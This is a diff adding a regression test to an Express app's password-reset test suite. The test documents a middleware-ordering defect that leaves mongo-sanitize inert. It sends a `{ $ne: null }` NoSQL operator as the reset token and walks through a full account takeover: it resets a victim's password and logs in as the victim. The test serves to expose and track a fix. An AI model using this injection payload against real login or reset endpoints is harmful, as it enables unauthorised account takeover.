@@ -149,3 +149,49 @@ describe("PATCH /resetpassword", () => {
         expect(reuse.status).toBe(200);
     });
 });
+
+describe("defect S9: the request sanitizer is inert (roadmap spec §5)", () => {
+    // DEFECT S9 (roadmap spec §5): app.js:85 registers sanitizeRequest before
+    // express.json(), so `sanitize(req.body)` runs against `undefined` and
+    // never touches the parsed body. mongo-sanitize is therefore never
+    // applied to anything an attacker controls, and both /resetpassword
+    // routes pass `clientUser.token` straight into a Mongo query. A caller
+    // who sends the operator `{ "$ne": null }` instead of a real token
+    // matches any user whose passwordToken field is set and non-null —
+    // which, combined with S1 (the token is never invalidated after use),
+    // is true forever for any victim who has ever used "forgot password".
+    // This is a full unauthenticated account takeover with zero knowledge
+    // of the real token. Phase 2 fixes the middleware ordering (S9) and the
+    // passwordtoken/passwordToken casing (S1); once fixed, the operator
+    // should be rejected and this test's 200s should become 400s.
+    it("takes over a victim's account using {$ne: null} instead of the real reset token", async () => {
+        const victim = await registerUser();
+        await post("/forgotpassword").send({ email: victim.email });
+
+        const attackerChosenPassword = "attacker-chosen-password";
+
+        // The attacker never learns the real token. `{ $ne: null }` matches
+        // it anyway because sanitize() never ran on the parsed body.
+        const readResponse = await post("/resetpassword").send({
+            email: victim.email,
+            token: { $ne: null },
+        });
+        expect(readResponse.status).toBe(200);
+
+        const patchResponse = await patch("/resetpassword").send({
+            email: victim.email,
+            token: { $ne: null },
+            password: attackerChosenPassword,
+            passwordRepeat: attackerChosenPassword,
+        });
+        expect(patchResponse.status).toBe(200);
+
+        // Full takeover: the attacker now logs in as the victim with a
+        // password only the attacker chose, having never seen the token.
+        const loginResponse = await request(app)
+            .post("/login")
+            .set("X-Forwarded-For", uniqueIp())
+            .send({ email: victim.email, password: attackerChosenPassword });
+        expect(loginResponse.status).toBe(200);
+    });
+});
